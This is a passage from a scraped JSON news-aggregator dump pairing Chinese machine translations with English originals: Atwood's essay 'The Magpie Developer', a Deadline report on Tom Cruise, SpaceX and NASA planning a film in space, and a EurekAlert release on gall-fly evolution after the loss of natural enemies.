Rails\u5f88\u611f\u5174\u8da3\u7684\u90a3\u4ef6\u4e8b\uff1f\u90a3\u662f\u53bb\u5e74\u7684\u4e8b\u4e86\u3002\u6211\u4eec\u5df2\u7ecf\u5411\u524d\u770b\u4e86\u3002\n\u5982\u679c\u4f60\u8003\u8651\u5230\u8fd9\u4e00\u70b9\uff0c\u4ece\u7edf\u8ba1\u4e0a\u770b\uff0c\u7edd\u5927\u591a\u6570\u7a0b\u5e8f\u5458\u8fd8\u6ca1\u6709\u4f53\u9a8c\u8fc7\u4efb\u4f55\u7c7b\u578b\u7684\u52a8\u6001\u8bed\u8a00-\u66f4\u4e0d\u7528\u8bf4Ruby\u4e86-\u8fd9\u91cc\u7684\u8352\u8c2c\u4e4b\u5904\u662f\u5d07\u9ad8\u7684\u3002\u4e00\u4e9b\u52a8\u6001\u8bed\u8a00\u529f\u80fd\u6b63\u5728\u9010\u6e10\u6df1\u5165\u5230Java\u548c.NET\u7684\u5821\u5792\u4e2d\uff0c\u4f46\u901f\u5ea6\u7f13\u6162\uff0c\u5e76\u53d6\u5f97\u4e86\u4e0d\u540c\u7a0b\u5ea6\u7684\u6210\u529f\u3002\u8fd9\u4e9b\u6240\u8c13\u7684\u601d\u60f3\u9886\u8896\u5728\u5176\u4ed6\u4eba\u6709\u673a\u4f1a\u5230\u8fbe\u4e4b\u524d\u5c31\u5df2\u7ecf\u79bb\u5f00\u4e86\u4e00\u4e2a\u865a\u62df\u7684\u9b3c\u57ce\u3002\n\u6211\u6210\u4e3a\u4e00\u540d\u7a0b\u5e8f\u5458\u662f\u56e0\u4e3a\u6211\u70ed\u7231\u8ba1\u7b97\u673a\uff0c\u800c\u8981\u70ed\u7231\u8ba1\u7b97\u673a\uff0c\u4f60\u5fc5\u987b\u70ed\u7231\u53d8\u9769\u3002\u6211\u4e5f\u662f\u3002\u4f46\u6211\u8ba4\u4e3a\u559c\u9e4a\u5f00\u53d1\u4eba\u5458\u6709\u65f6\u559c\u6b22\u6539\u53d8\uff0c\u8fd9\u635f\u5bb3\u4e86\u4ed6\u81ea\u5df1\u7684\u624b\u827a\u3002\u5b89\u8fea\u00b7\u4ea8\u7279(Andy Hunt)\u548c\u6234\u592b\u00b7\u6258\u9a6c\u65af(Dave Thomas)\u8fd9\u4e24\u4f4d\u52a1\u5b9e\u7684\u7a0b\u5e8f\u5458\u662fRuby\u4e0a\u4e00\u6b21\u7ffb\u5929\u8986\u5730\u7684\u53d8\u5316\u7684\u91cd\u8981\u7ec4\u6210\u90e8\u5206\uff0c\u4ed6\u4eec\u57282004\u5e74\u7684IEEE\u4e13\u680f(Pdf)\u4e2d\u5f88\u597d\u5730\u9610\u8ff0\u4e86\u8fd9\u4e00\u70b9\u3002\n\u7528\u6237\u5e76\u4e0d\u5173\u5fc3\u60a8\u4f7f\u7528\u7684\u662fJ2EE\u3001Cobol\u8fd8\u662f\u4e00\u5bf9\u9b54\u77f3\u3002\u4ed6\u4eec\u5e0c\u671b\u4fe1\u7528\u5361\u6388\u6743\u80fd\u591f\u6b63\u786e\u5904\u7406\uff0c\u5e76\u6253\u5370\u5e93\u5b58\u62a5\u544a\u3002\u4f60\u5e2e\u52a9\u4ed6\u4eec\u53d1\u73b0\u4ed6\u4eec\u771f\u6b63\u9700\u8981\u7684\u662f\u4ec0\u4e48\uff0c\u5e76\u5171\u540c\u60f3\u8c61\u4e00\u4e2a\u7cfb\u7edf\u3002Pete\u6ca1\u6709\u5728\u6700\u65b0\u6280\u672f\u5c16\u7aef\u7684\u8270\u96be\u7ade\u8d5b\u4e2d\u5fd8\u4e4e\u6240\u4ee5\uff0c\u800c\u662f\u4e13\u6ce8\u4e8e\u6784\u5efa\u4e00\u4e2a[\u7528COBOL]\u4e3a\u4ed6\u548c\u4ed6\u7684\u5ba2\u6237\u5de5\u4f5c\u7684\u7cfb\u7edf\u3002\u5b83\u5f88\u7b80\u5355\uff0c\u4e5f\u8bb8\u6309\u7167\u6211\u4eec\u7684\u9ad8\u6807\u51c6\u51e0\u4e4e\u662f\u539f\u59cb\u7684\u3002\u4f46\u662f\u5b83\u6613\u4e8e\u4f7f\u7528\uff0c\u6613\u4e8e\u7406\u89e3\uff0c\u5e76\u4e14\u90e8\u7f72\u8fc5\u901f\u3002Pete&#39\uff1b\u7684\u6846\u67b6\u4f7f\u7528\u4e86\u591a\u79cd\u6280\u672f\uff1a\u4e00\u4e9b\u5efa\u6a21\u3001\u4e00\u4e9b\u4ee3\u7801\u751f\u6210\u3001\u4e00\u4e9b\u53ef\u91cd\u7528\u7ec4\u4ef6\u7b49\u7b49\u3002\u4ed6\u8fd0\u7528\u57fa\u672c\u7684\u5b9e\u7528\u4e3b\u4e49\u539f\u5219\uff0c\u7528\u8d77\u4f5c\u7528\u7684\u4e1c\u897f\uff0c\u800c\u4e0d\u662f\u4ec5\u4ec5\u662f\u65b0\u7684\u6216\u65f6\u9ae6\u7684\u4e1c\u897f\u3002\n\u6211\u4eec\u5931\u8d25\u4e86(\u4f5c\u4e3a\u4e00\u4e2a\u884c\u4e1a)\uff0c\u5f53\u6211\u4eec\u8bd5\u56fe\u63d0\u51fa\u4e00\u4e2a\u5168\u80fd\u7684\u3001\u5168\u80fd\u7684\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u6765\u7ed3\u675f\u6240\u6709\u7684\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u65f6\u3002\u4e5f\u8bb8\u8fd9\u662f\u56e0\u4e3a\u6ca1\u6709\u5b8f\u4f1f\u7684\u3001\u7edf\u4e00\u7684\u7406\u8bba\u7b49\u5f85\u7740\u51fa\u73b0\u3002\u540e\u73b0\u4ee3\u4e3b\u4e49\u7684\u6807\u5fd7\u4e4b\u4e00--\u4e00\u4e9b\u4eba\u8ba4\u4e3a\u8fd9\u662f\u6211\u4eec\u8fd9\u4e2a\u65f6\u4ee3\u7684\u4e00\u4e2a\u663e\u8457\u7279\u5f81--\u662f\u6ca1\u6709\u5b8f\u5927\u7684\u53d9\u4e8b\uff0c\u6ca1\u6709\u6700\u91cd\u8981\u7684\u6545\u4e8b\u6765\u6307\u5f15\u6211\u4eec\u3002\u53d6\u800c\u4ee3\u4e4b\u7684\u662f\uff0c\u6709\u5f88\u591a\u5c0f\u6545\u4e8b\u3002\n\u5982\u679c\u4f60\u6ca1\u6709\u628a\u6700\u95ea\u4eae\u3001\u6700\u65b0\u7684\u4e1c\u897f\u653e\u5728\u4f60\u7684\u5de2\u91cc\uff0c\u4e0d\u8981\u89c9\u5f97\u529b\u4e0d\u4ece\u5fc3\u3002\u53ea\u8981\u4f60\u548c\u4f60\u7684\u7528\u6237\u90fd\u6ee1\u610f\uff0c\u8c01\u4f1a\u5728\u4e4e\u4f60\u4f7f\u7528\u7684\u662f\u4ec0\u4e48\u6280\u672f\u5462\uff1f\n\u8fd9\u5c31\u662f\u65b0\u4e8b\u7269\u7684\u7f8e\u5999\u4e4b\u5904\uff1a\u603b\u4f1a\u6709\u65b0\u4e8b\u7269\u51fa\u73b0\u3002\u4e0d\u8981\u8ba9\u8ffd\u6c42\u65b0\u7684\u3001\u95ea\u4eae\u7684\u4e1c\u897f\u610f\u5916\u5730\u6210\u4e3a\u4f60\u7684\u76ee\u6807\u3002\u907f\u514d\u6210\u4e3a\u559c\u9e4a\u5f00\u53d1\u4eba\u5458\u3002\u5728\u8ffd\u6c42\u95ea\u4eae\u548c\u65b0\u7684\u4e1c\u897f\u65f6\u8981\u6709\u9009\u62e9\u6027\uff0c\u4f60\u53ef\u80fd\u4f1a\u53d1\u73b0\u81ea\u5df1\u662f\u4e00\u4e2a\u66f4\u597d\u7684\u5f00\u53d1\u4eba\u5458\u3002", "note_en": "I&#39;ve often thought that software developers were akin to  Magpies, birds notorious for stealing shiny items to decorate their complex nests. Like Magpies, software developers are unusually smart and curious creatures, almost by definition. But  we are too easily distracted by shiny new toys and playthings.\n  I no longer find Scott Hanselman&#39;s  Ultimate Developer Tool list inspiring. Instead, it&#39;s fatiguing. The pace of change in the world of software  is relentless. We&#39;re so inundated with the Shiny and the New that the very concepts themselves start to disintegrate, the words repeated over and over and over until they devolve into a meaningless stream of vowels and consonants. &#34;Shiny&#34; and &#34;new&#34; become mundane, even commonplace. It&#39;s no longer unique for something to be new, no longer interesting when something is shiny. Eventually,  you grow weary of the endless procession of shiny new things.\n  Over a year ago I unsubscribed from  Steve&#39;s blog because he had a habit of writing in breathless fashion about the latest shiny new thing \u2013 often several times a day. I see too many people I know getting caught up in the breathless hype and  forgetting to think about whether the latest shiny new thing really matters in the grand scheme of things.\n  [Robert Scoble] says that he gets too much email and that is ineffective for getting PR releases to him. He suggests that what you should do now is leave him a message on his Facebook wall. Dear god and/or Bob. In the time I&#39;ve followed Scoble, I must have seen something like this a dozen times from him. Don&#39;t email, Twitter me. Don&#39;t Twitter, Pwnce. Jaiku me. Leave a wall message, send an SMS, just call me, email me, don&#39;t email me, don&#39;t call me. Enough already! I&#39;m not even trying to get in contact with him, and I find this constant migration from platform to platform to be a load of shit that just wearies me. I felt the same way when I dropped TechCrunch, well over a year ago. I got so tired of hearing about another slightly different way of doing what we were already doing and why that tiny difference was worth dropping everything and moving over.  I officially renounce the search for the newer and shinier.\n It isn&#39;t just the neverending stream of tech news. It&#39;s also the tidal push and pull of a  thousand software religious wars that continually wears us down, like errant rocks in a rapidly flowing stream. I bet  the process David Megginson outlines sounds awfully familiar:\n 1. Elite (guru) developers notice too many riff-raff using their current programming language, and start looking for something that will distinguish them better from their mediocre colleagues. 2. Elite developers take their shopping list of current annoyances and look for a new, little-known language that apparently has fewer of them.\n 3. Elite developers start to drive the development of the new language, contributing code, writing libraries, etc., then evangelize the new language. Sub-elite (senior) developers follow the elite developers to the new language, creating a market for books, training, etc., and also accelerating the development and testing of the language.\n 4. Sub-elite developers, who have huge influence (elite developers tend to work in isolation on research projects rather than on production development teams), begin pushing for the new language in the workplace.\n 5. The huge mass of regular developers realize that they have to start buying books and taking courses to learn a new language.\n 6. Elite developers notice too many riff-raff using their current programming language, and start looking for something that will distinguish them better from their mediocre colleagues.\n I hope you&#39;re sitting down, because I&#39;ve got some bad news for you. That Ruby on Rails thing you were so interested in? That&#39;s  so last year. We&#39;ve  moved on.\n If you consider that, statistically, the vast majority of programmers have yet to experience a dynamic language of  any kind \u2013 much less Ruby \u2013 the absurdity here is sublime. Some dynamic language features are trickling down to the bastions of Java and .NET, but slowly, and with varying levels of success. These so-called thought leaders have left a virtual ghost town before  anyone else had a chance to arrive.\n I became a programmer because I love computers, and to love computers,  you must love change. And I do. But I think  the magpie developer sometimes loves change to the detriment of his own craft. Andy Hunt and Dave Thomas, the  Pragmatic Programmers who were a big part of the last sea change in Ruby, said it quite well in  a 2004 IEEE column (pdf).\n Users don&#39;t care whether you use J2EE, Cobol, or a pair of magic rocks. They want their credit card authorization to process correctly and their inventory reports to print. You help them discover what they really need and jointly imagine a system. Instead of getting carried away with the difficult race up the cutting edge of the latest technology, Pete concentrated on building a system [in COBOL] that works for him and his clients. It&#39;s simple, perhaps almost primitive by our lofty standards. But it&#39;s easy to use, easy to understand, and fast to deploy. Pete&#39;s framework uses a mixture of technologies: some modeling, some code generation, some reusable components, and so on. He applies the fundamental pragmatic principle and uses what works, not what&#39;s merely new or fashionable.\n We fail (as an industry) when we try to come up with the all-singing, all-dancing applications framework to end all applications frameworks. Maybe that&#39;s because there is no grand, unified theory waiting to emerge. One of the hallmarks of postmodernism \u2013 which some think is a distinguishing feature of our times \u2013 is that there&#39;s no &#34;grand narrative,&#34; no overarching story to guide us. Instead, there are lots of little stories.\n Don&#39;t feel inadequate if you aren&#39;t lining your nest with the shiniest, newest things possible.  Who cares what technology you use, as long as it  works, and both you and your users are happy with it?\n That&#39;s the beauty of new things: there&#39;s always a new one coming along. Don&#39;t let the pursuit of new, shiny things accidentally become your goal. Avoid becoming a magpie developer. Be selective in your pursuit of the shiny and new, and you may find yourself a better developer for it.", "posttime": "2020-05-05 15:53:06", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u5f00\u53d1,\u559c\u9e4a,magpie,\u4e1c\u897f,language", "title": "\u201c\u559c\u9e4a\u5f00\u53d1\u5546\u201d(2008)", "title_en": "The Magpie Developer (2008)", "transed": 1, "url": "https://blog.codinghorror.com/the-magpie-developer/", "via": "", "real_tags": ["\u5f00\u53d1", "\u559c\u9e4a", "magpie", "\u4e1c\u897f", "language"]}, {"category": "", "categoryclass": "", "imagename": "cb555982301500ec1a1671531d6ab5c6.jpg", "infoid": 1000700, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u72ec\u5bb6\u62a5\u9053\uff1a\u6211\u542c\u8bf4And\u7684Space X\u6b63\u5728\u4e0eNASA\u5408\u4f5c\u4e00\u4e2a\u9879\u76ee\uff0c\u8fd9\u5c06\u662f\u7b2c\u4e00\u90e8\u5728\u5916\u5c42\u7a7a\u95f4\u62cd\u6444\u7684\u53d9\u4e8b\u6545\u4e8b\u7247-\u4e00\u90e8\u52a8\u4f5c\u5192\u9669\u7535\u5f71\u3002\u8fd9\u4e0d\u662f\u4e00\u90e8\u201c\u4f7f\u547d\uff1a\u4e0d\u53ef\u80fd\u201d\u7684\u7535\u5f71\uff0c\u76ee\u524d\u8fd8\u6ca1\u6709\u4e00\u5bb6\u5236\u7247\u5382\u5728\u8003\u8651\u8fd9\u4e00\u70b9\uff0c\u4f46\u8bf7\u5728\u6211\u5f97\u5230\u6d88\u606f\u540e\u5bfb\u627e\u66f4\u591a\u7684\u6d88\u606f\u3002\u4f46\u8fd9\u662f\u771f\u5b9e\u7684\uff0c\u5c3d\u7ba1\u8fd8\u5904\u4e8e\u53d1\u5c04\u7684\u65e9\u671f\u9636\u6bb5\u3002\n\u4efb\u52a1\uff1a\u4e0d\u53ef\u80fd\u7684\u5760\u843d\u4f11\u606f\u4e86\u4e00\u4e0b\uff0c\u771f\u7684\u662f\u5f53\u4ed6\u4ece\u4e00\u4e2a\u5c4b\u9876\u8df3\u5230\u53e6\u4e00\u4e2a\u5c4b\u9876\u65f6\u626d\u4f24\u4e86\u811a\u8e1d\uff0c\u4ed6\u4e5f\u6302\u5728\u76f4\u5347\u673a\u4e0a\uff1b\u4ed6\u5728\u201c\u4f7f\u547d\uff1a\u4e0d\u53ef\u80fd\u7684\u76d7\u8d3c\u4e4b\u56fd\u201d\u548c\u201c\u4efb\u52a1\uff1a\u4e0d\u53ef\u80fd\u7684\u5e7d\u7075\u534f\u8bae\u201d\u4e2d\u8d77\u98de\u65f6\uff0c\u6302\u5728\u55b7\u6c14\u5f0f\u98de\u673a\u7684\u4fa7\u9762\u3002\u4ed6\u722c\u4e0a\u4e86\u8fea\u62dc\u6469\u5929\u5927\u697c\u54c8\u5229\u6cd5\u5854\uff0c\u5e76\u8868\u6f14\u4e86123\u5c42\u9ad8\u7684\u7279\u6280\u3002\u4ed6\u4e00\u4e1d\u4e0d\u82df\u5730\u51c6\u5907\u8fd9\u4e9b\u4ed6\u505a\u7684\u7279\u6280\uff0c\u5149\u662f\u770b\u7740\u5c31\u8ba9\u4eba\u6bdb\u9aa8\u609a\u7136\u3002\n\u4ece\u6765\u6ca1\u6709\u4e00\u4e2a\u7537\u4e3b\u89d2(\u6210\u9f99\u53ef\u80fd\u4f1a\u5bf9\u6b64\u63d0\u51fa\u5f02\u8bae)\u50cf\u514b\u9c81\u65af\u90a3\u6837\u7ecf\u5e38\u4ee5\u6700\u73b0\u5b9e\u7684\u52a8\u4f5c\u955c\u5934\u7684\u540d\u4e49\u5c06\u81ea\u5df1\u7f6e\u4e8e\u5371\u9669\u4e4b\u4e2d\u3002\u5982\u679c\u4ed6\u5728\u9a6c\u65af\u514b\u7684\u5b87\u5b99\u98de\u8239\u4e0a\u6210\u529f\u62cd\u6444\u4e86\u4e00\u4e2a\u9879\u76ee\uff0c\u4ed6\u5c06\u662f\u597d\u83b1\u575e\u8bb0\u5f55\u518c\u4e0a\u7684\u552f\u4e00\u4e00\u4e2a\u4eba\u3002\u656c\u8bf7\u5173\u6ce8\u3002", "note_en": "EXCLUSIVE: I\u2019m hearing that   and  \u2019s Space X are working on a project with NASA that would be the first narrative feature film \u2013 an action adventure \u2013 to be shot in outer space. It\u2019s not a  Mission: Impossible film and no studio is in the mix at this stage but look for more news as I get it. But this is real, albeit in the early stages of liftoff.\n Mission: Impossible Fallout took a break, literally when he broke his ankle in a leap from one rooftop to the other and he also hung from a helicopter; he hung from the side of a jet plane during takeoff in  Mission: Impossible Rogue Nation, and in  Mission: Impossible: Ghost Protocol he scaled the Burj Khalifa, the Dubai skyscraper, and executed stunts 123 floors up. He is meticulous in preparing these stunts he does, which are frightening just to watch.\n  There has never been a leading man (Jackie Chan might dispute this) who puts himself at risk as often as does Cruise, in the name of the most realistic action sequences possible. If he is successful shooting a project in Musk\u2019s space ship, he will be alone in the Hollywood record books. Stay tuned.", "posttime": "2020-05-05 13:14:47", "tags": "\u57c3\u9686\u00b7\u9a6c\u65af\u514b,nasa,\u7f8e\u56fd\u5b87\u822a\u5c40,\u592a\u7a7a,\u514b\u9c81\u65af", "title": "\u6c64\u59c6\u00b7\u514b\u9c81\u65af\u4e0e\u7f8e\u56fd\u5b87\u822a\u5c40\u57c3\u9686\u00b7\u9a6c\u65af\u514b\u5408\u4f5c\u5728\u592a\u7a7a\u62cd\u6444\u52a8\u4f5c\u7247", "title_en": "Tom Cruise teaming with Elon Musk, NASA to shoot action movie in space", "transed": 1, "url": "https://deadline.com/2020/05/tom-cruise-movie-shot-in-outer-space-elon-musk-spacex-unprecedented-in-hollywood-1202925849/", "via": "", "source_name": "Hacker News", "source_domain": "news.ycombinator.com", "real_tags": ["\u57c3\u9686\u00b7\u9a6c\u65af\u514b", "nasa", "\u7f8e\u56fd\u5b87\u822a\u5c40", "\u592a\u7a7a", "\u514b\u9c81\u65af"]}, {"category": "", "categoryclass": "", "imagename": "863df9214fa902e155f3f887735f0fe6.jpg", "infoid": 1000699, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u7269\u79cd\u706d\u7edd\u5bf9\u5e78\u5b58\u7269\u79cd\u7684\u8fdb\u5316\u6709\u4ec0\u4e48\u5f71\u54cd\uff1f\u8fdb\u5316\u751f\u7269\u5b66\u5bb6\u901a\u8fc7\u5bf9\u4e00\u79cd\u523a\u53f6\u82cd\u8747\u53ca\u5176\u6355\u98df\u6027\u5929\u654c\u8fdb\u884c\u4e86\u4e00\u9879\u91ce\u5916\u5b9e\u9a8c\uff0c\u5bf9\u8fd9\u4e2a\u95ee\u9898\u8fdb\u884c\u4e86\u7814\u7a76\u3002\u4ed6\u4eec\u53d1\u73b0\uff0c\u5931\u53bb\u5929\u654c\u53ef\u80fd\u4f1a\u4f7f\u730e\u7269\u66f4\u96be\u9002\u5e94\u672a\u6765\u7684\u73af\u5883\u3002\n\u6839\u636e\u8bb8\u591a\u4e13\u5bb6\u7684\u8bf4\u6cd5\uff0c\u5730\u7403\u6b63\u5904\u4e8e\u7b2c\u516d\u6b21\u5927\u706d\u7edd\u7684\u5f00\u59cb\uff0c\u8fd9\u5df2\u7ecf\u5bf9\u81ea\u7136\u751f\u6001\u7cfb\u7edf\u7684\u529f\u80fd\u4ea7\u751f\u4e86\u53ef\u6015\u7684\u540e\u679c\u3002\u76ee\u524d\u5c1a\u4e0d\u6e05\u695a\u7684\u662f\uff0c\u8fd9\u4e9b\u7269\u79cd\u7684\u706d\u7edd\u5c06\u5982\u4f55\u6539\u53d8\u5269\u4f59\u7269\u79cd\u672a\u6765\u7684\u9002\u5e94\u80fd\u529b\u3002\n\u82cf\u9ece\u4e16\u5927\u5b66\u7684\u7814\u7a76\u4eba\u5458\u73b0\u5728\u5df2\u7ecf\u5728\u52a0\u5229\u798f\u5c3c\u4e9a\u5dde\u8fdb\u884c\u4e86\u4e00\u9879\u5b9e\u5730\u5b9e\u9a8c\u6765\u63a2\u7d22\u8fd9\u4e2a\u95ee\u9898\u3002\u4ed6\u4eec\u8c03\u67e5\u4e86\u5f53\u4e00\u7fa4\u5929\u654c\u88ab\u79fb\u8d70\u65f6\uff0c\u4e00\u53ea\u5c0f\u82cd\u8747\u7684\u7279\u5f81\u662f\u5982\u4f55\u53d8\u5316\u7684\u3002\u4ece\u4ed6\u4eec\u7684\u89c2\u5bdf\u4e2d\uff0c\u4ed6\u4eec\u5f97\u51fa\u4e86\u5173\u4e8e\u679c\u8747\u57fa\u56e0\u591a\u6837\u6027\u53d8\u5316\u7684\u7ed3\u8bba\u3002\n\u82cd\u8747Iteomyia salicisverruca\u751f\u6d3b\u5728\u67f3\u53f6\u4e0a\uff0c\u5728\u5176\u5e7c\u866b\u9636\u6bb5\u8bf1\u5bfc\u5f62\u6210\u9f7f\u72b6\u7684\u88ab\u79f0\u4e3a\u866b\u80c6\u7684\u751f\u957f\u3002\u8fd9\u79cd\u82cd\u8747\u7684\u5929\u654c\u5305\u62ec\u51e0\u79cd\u5bc4\u751f\u8702\u3002\u8fd9\u4e9b\u9ec4\u8702\u5728\u866b\u80c6\u5185\u7684\u82cd\u8747\u5e7c\u866b\u5185\u4ea7\u5375\uff0c\u7136\u540e\u5728\u90a3\u91cc\u53d1\u80b2\u6210\u88ab\u79f0\u4e3a\u5bc4\u751f\u8702\u7684\u5bc4\u751f\u6027\u6355\u98df\u8005\u3002\u5728\u6210\u5e74\u9ec4\u8702\u79bb\u5f00\u866b\u80c6\u4e4b\u524d\uff0c\u5b83\u4f1a\u541e\u566c\u5b83\u7684\u5bbf\u4e3b--\u82cd\u8747\u3002\n\u6709\u4e9b\u79cd\u7c7b\u7684\u5bc4\u751f\u8702\u5728\u866b\u80c6\u5f62\u6210\u4e4b\u524d\u653b\u51fb\uff0c\u800c\u53e6\u4e00\u4e9b\u79cd\u7c7b\u5219\u5728\u82cd\u8747\u5e7c\u866b\u53d1\u80b2\u540e\u671f\u5bc4\u751f\u5e76\u7a7f\u900f\u866b\u80c6\u3002\u7814\u7a76\u4eba\u5458\u4e13\u95e8\u6d88\u706d\u4e86\u540e\u4e00\u7ec4\u5929\u654c\uff0c\u5728\u5b83\u4eec\u53d7\u5230\u653b\u51fb\u4e4b\u524d\uff0c\u5728\u6709\u866b\u5bb3\u7684\u6811\u53f6\u4e0a\u8d34\u4e0a\u4e86\u7f51\u773c\u7ec6\u5bc6\u7684\u7f51\u3002\n\u4e09\u4e2a\u6708\u540e\uff0c\u751f\u7269\u5b66\u5bb6\u6536\u96c6\u4e86\u5927\u7ea6600\u4e2a\u866b\u80c6\uff0c\u5e76\u68c0\u67e5\u82cd\u8747\u5e7c\u866b\u662f\u5426\u5b58\u6d3b\u4e0b\u6765\u3002\u4ed6\u4eec\u8fd8\u6d4b\u91cf\u4e86\u5f71\u54cd\u82cd\u8747\u514d\u53d7\u5bc4\u751f\u866b\u653b\u51fb\u5b58\u6d3b\u7684\u4e09\u4e2a\u7279\u5f81\uff1a\u866b\u80c6\u7684\u5927\u5c0f\uff1b\u866b\u80c6\u4e2d\u82cd\u8747\u7684\u6570\u91cf\uff1b\u4ee5\u53ca\u82cd\u8747\u5728\u67f3\u6811\u7279\u5b9a\u9057\u4f20\u54c1\u79cd\u4e0a\u4ea7\u751f\u866b\u80c6\u7684\u504f\u597d\u3002\u4f7f\u7528\u8fd9\u4e9b\u6570\u636e\uff0c\u7136\u540e\u4ed6\u4eec\u4f7f\u7528\u8ba1\u7b97\u673a\u6a21\u578b\u521b\u5efa\u4e86\u5065\u5eb7\u666f\u89c2\uff0c\u8fd9\u4e9b\u6a21\u578b\u53ef\u89c6\u5316\u4e86\u4e00\u4e2a\u7269\u79cd\u7684\u9002\u5e94\u6027\u3002\n\u4e8b\u5b9e\u8bc1\u660e\uff0c\u8fd9\u4e09\u4e2a\u7279\u5f81\u7684\u4e0d\u540c\u7ec4\u5408\u6709\u52a9\u4e8e\u82cd\u8747\u5b58\u6d3b\uff1f\u5f53\u82cd\u8747\u7684\u6240\u6709\u5929\u654c\u90fd\u5728\u573a\u7684\u65f6\u5019\u3002\u56e0\u6b64\uff0c\u8fd9\u9879\u7814\u7a76\u7684\u4e3b\u8981\u4f5c\u8005\u9a6c\u7279\u00b7\u5df4\u4f2f(Matt Barbour)\u8bf4\uff0c\u6709\u51e0\u4e2a\u540c\u6837\u597d\u7684\u89e3\u51b3\u65b9\u6848\u53ef\u4ee5\u786e\u4fdd\u82cd\u8747\u7684\u751f\u5b58\u3002\u76f8\u6bd4\u4e4b\u4e0b\uff0c\u5728\u4e00\u4e9b\u5929\u654c\u88ab\u79fb\u9664\u540e\uff0c\u53ea\u6709\u4e00\u79cd\u7279\u5b9a\u7684\u7279\u5f81\u7ec4\u5408\u5e2e\u52a9\u82cd\u8747\u5b58\u6d3b\u3002\u8fd9\u8868\u660e\uff0c\u5929\u654c\u7684\u706d\u7edd\u9650\u5236\u4e86\u679c\u8747\u671d\u7740\u4e00\u4e2a\u6700\u4f73\u89e3\u51b3\u65b9\u6848\u8fdb\u5316\u3002\u56e0\u6b64\uff0c\u5bfc\u81f4\u6027\u72b6\u4e0d\u540c\u53d1\u5c55\u7684\u9057\u4f20\u53d8\u5f02\u53ef\u80fd\u4f1a\u6c38\u4e45\u5730\u4e22\u5931\u5728\u679c\u8747\u7684\u57fa\u56e0\u7ec4\u4e2d\u3002\n\u8fd9\u79cd\u591a\u6837\u6027\u7684\u4e27\u5931\u53ef\u80fd\u662f\u6709\u540e\u679c\u7684\uff1a\u5df4\u4f2f\u8bf4\uff0c\u6f5c\u5728\u7684\u751f\u5b58\u89e3\u51b3\u65b9\u6848\u7684\u591a\u6837\u6027\u4fdd\u62a4\u4e86\u80c6\u6c41\u7279\u5f81\u4e2d\u7684\u9057\u4f20\u53d8\u5f02\u6027\u3002\u7531\u4e8e\u9057\u4f20\u53d8\u5f02\u4e3a\u8fdb\u5316\u63d0\u4f9b\u4e86\u539f\u6750\u6599\uff0c\u7814\u7a76\u7ed3\u679c\u8868\u660e\uff0c\u8fd9\u79cd\u82cd\u8747\u5929\u654c\u7684\u706d\u7edd\u53ef\u80fd\u4f1a\u4f7f\u5176\u66f4\u96be\u9002\u5e94\u4e0d\u65ad\u53d8\u5316\u7684\u73af\u5883\u3002\n\u5df4\u4f2f\u8bf4\uff0c\u8003\u8651\u5230\u5927\u5c40\uff0c\u6211\u4eec\u7684\u7814\u7a76\u6697\u793a\u4e86\u7269\u79cd\u706d\u7edd\u7684\u6f5c\u5728\u6f5c\u5728\u526f\u4f5c\u7528\u3002\u5929\u654c\u7684\u706d\u7edd\u53ef\u80fd\u4f1a\u5371\u53ca\u5269\u4f59\u7269\u79cd\u5728\u4e0d\u786e\u5b9a\u548c\u4e0d\u65ad\u53d8\u5316\u7684\u4e16\u754c\u4e2d\u9002\u5e94\u548c\u575a\u6301\u7684\u80fd\u529b\u3002\u5982\u679c\u8fd9\u662f\u771f\u7684\uff0c\u8fd9\u5c06\u4f7f\u8bb8\u591a\u751f\u6001\u7cfb\u7edf\u9762\u4e34\u6bd4\u6211\u4eec\u76ee\u524d\u8ba4\u8bc6\u5230\u7684\u66f4\u5927\u7684\u98ce\u9669\u3002\n\u514d\u8d23\u58f0\u660e\uff1aAAAS\u548cEurekAlert\uff01\u4e0d\u5bf9\u53d1\u5e03\u5230EurekAlert\u7684\u65b0\u95fb\u7a3f\u7684\u51c6\u786e\u6027\u8d1f\u8d23\uff01\u7531\u6350\u52a9\u673a\u6784\u6216\u901a\u8fc7EurekAlert\u7cfb\u7edf\u4f7f\u7528\u4efb\u4f55\u4fe1\u606f\u3002", "note_en": "What effect does extinction of species have on the evolution of surviving species? Evolutionary biologists have investigated this question by conducting a field experiment with a leaf galling fly and its predatory enemies. They found that losing its natural enemies could make it more difficult for the prey to adapt to future environments.\n  According to many experts, the Earth is at the beginning of its sixth mass extinction, which is already having dire consequences for the functioning of natural ecosystems. What remains unclear is how these extinctions will alter the future ability of remaining species to adapt.\n  Researchers from the University of Zurich have now pursued this question with a field experiment in California. They investigated how the traits of a tiny fly changed when a group of its natural enemies was removed. From their observations, they drew conclusions about changes in the genetic diversity of the flies.\n    The fly Iteomyia salicisverruca lives on willow leaves in tooth-shaped growths called galls, which it induces in its larval stage. The natural enemies of this fly include several species of parasitic wasps. These wasps lay their eggs inside the fly larva within the gall, where they then develop into parasitic predators known as parasitoids. Before the adult wasp leaves the gall, it devours its host, the fly.\n  Some species of these parasitoids attack before the gall is formed, while others parasitize fly larvae later in their development and pierce through the gall. The researchers specifically eliminated the latter group of natural enemies by attaching fine-meshed nets over leaves with galls before they were attacked.\n  After three months, the biologists collected about 600 galls and checked if the fly larvae had survived. They also measured three traits that influence a fly&#39;s survival from parasitoid attack: the size of the gall; the number of flies within a gall; and the fly&#39;s preference to create galls on particular genetic varieties of willow trees. Using these data they then created &#34;fitness landscapes&#34; using computer models, which visualize the adaptability of a species.\n    It turned out that different combinations of these three traits helped flies survive ? when all of the fly&#39;s natural enemies were present. &#34;So there are several equally good solutions that ensure the survival of the fly,&#34; says Matt Barbour, the study&#39;s lead author. In contrast, after some natural enemies were removed, only one specific combination of traits helped flies survive. &#34;This suggests that the extinction of natural enemies constrains fly evolution toward only one optimal solution.&#34; Genetic variations that lead to a different development of the traits could thus be permanently lost in the flies&#39; genome.\n  This loss of diversity might be of consequence: &#34;The diversity of potential solutions for survival acts to preserve genetic variability in the gall&#39;s traits,&#34; says Barbour. And since genetic variation provides the raw material for evolution, the findings suggest that the extinction of this fly&#39;s natural enemies may make it more difficult for it to adapt to a changing environment.\n  &#34;Thinking about the big picture, our study hints at a potential insidious side effect of extinctions,&#34; says 